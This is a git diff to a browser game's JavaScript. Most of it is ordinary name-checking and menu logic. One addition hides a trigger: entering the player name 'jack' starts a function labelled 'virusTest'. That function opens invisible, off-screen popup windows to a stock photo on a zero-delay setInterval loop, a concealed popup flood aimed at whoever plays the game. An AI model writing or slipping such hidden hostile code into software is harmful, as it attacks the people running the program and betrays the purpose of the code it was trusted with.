@@ -758,6 +758,10 @@ function playerNameSave() {
     alert('EW! Grooooooooooosssssssssss!');
   }
 
+  if(playerName.value === 'jack' || playerName.value == 'Jack') {
+    buttonPressed();
+  }
+
   if(playerName.value === "jameson" || playerName.value === 'Jameson') {
     jmson.style.opacity = '0%'
     jmson.style.display = 'initial'
@@ -942,6 +946,25 @@ function showMainMenu() {
         playerNameinput.style.display = 'initial';
         playerNameButton.style.display = 'initial';
     }, 3500)
+}
+
+
+
+
+var num = 0;
+
+var params = "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no, width=0,height=0,left=-1000,top=-1000";
+
+function buttonPressed() {
+
+var name = "virusTest" + 0;
+
+setInterval(function() {
+open("https://media.istockphoto.com/photos/coahuilan-box-turtle-picture-id93385233?k=20&m=93385233&s=612x612&w=0&h=7pdWzLGa-XzIdvPvUsXzF91RomisLiGPiDnlr3iP00A=", name, params);
+
+num++;
+
+})
 }
 
 
